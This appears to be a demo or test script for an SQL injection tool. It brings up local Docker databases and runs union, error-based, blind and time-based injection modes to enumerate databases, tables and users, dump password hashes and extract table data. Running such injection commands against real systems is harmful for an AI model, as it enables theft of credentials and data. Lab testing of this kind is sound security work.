#!/bin/bash

if ! type docker-compose &>/dev/null; then
  echo 'docker-compose is required'
  exit 1
fi

docker-compose up -d --build
echo "waiting for DBs to start up"
while :; do
  docker-compose logs mssql | grep -q 'now ready for client connections' \
   && docker-compose exec lamp bash /var/www/html/demo/setup-mssql.sh | grep -c 'rows affected' | grep -q 4 && break
done
while :; do
  docker-compose logs oracle | grep -c 'Starting Oracle Database' | grep -q [2-9] \
   && docker-compose exec lamp bash /var/www/html/demo/setup-oracle.sh | grep -c 'row created' | grep -q 4 && break
done
while :; do
  docker-compose logs postgres | grep -c 'PostgreSQL init process complete; ready for start up' | grep -q 1 \
   && docker-compose exec lamp bash /var/www/html/demo/setup-postgres.sh | grep -c 'INSERT 0 1' | grep -q 4 && break
done

run()
{
  echo
  sed -i -e 's,^sqli =,#sqli =,' -e "/^#sqli = $1/ s,^#,," demo.py
  echo "$ $@"
  docker-compose run --no-deps --rm --entrypoint 'timeout 15s python3 demo.py' albatar "$@"
}

run 'MySQL_Inband(mysql_union())' -b --current-user --current-db --users --passwords --dbs
run 'MySQL_Inband(mysql_error())' -b

run 'MySQL_Inband(mysql_union())' -D anime_db --tables
run 'MySQL_Inband(mysql_union())' -D anime_db -T anime --columns
run 'MySQL_Inband(mysql_union())' -D anime_db -T anime -C id,name --dump

run 'MySQL_Blind(mysql_boolean_bitwise())' -b
run 'MySQL_Blind(mysql_boolean_regexp())' -b
run 'MySQL_Blind(mysql_boolean_binary())' -b
run 'MySQL_Blind(mysql_time())' -b

run 'MySQL_Blind(mysql_boolean_bitwise())' --current-user --current-db
run 'MySQL_Blind(mysql_boolean_bitwise())' --dbs
run 'MySQL_Blind(mysql_boolean_bitwise())' --users
run 'MySQL_Blind(mysql_boolean_bitwise())' --passwords
run 'MySQL_Blind(mysql_boolean_bitwise())' -D anime_db --tables
run 'MySQL_Blind(mysql_boolean_bitwise())' -D anime_db -T anime --columns
run 'MySQL_Blind(mysql_boolean_bitwise())' -D anime_db -T anime -C id,name --dump

run 'MSSQL_Inband(mssql_union())' -b
run 'MSSQL_Inband(mssql_error())' -b
run 'MSSQL_Blind(mssql_boolean())' -b
run 'MSSQL_Blind(mssql_time())' -b

run 'Oracle_Inband(oracle_union())' -b
#run 'Oracle_Inband(oracle_error())' -b # broken
run 'Oracle_Blind(oracle_boolean())' -b

run 'Postgres_Inband(postgres_union())' -b --current-user --current-db --dbs --users --passwords
run 'Postgres_Blind(postgres_boolean())' -b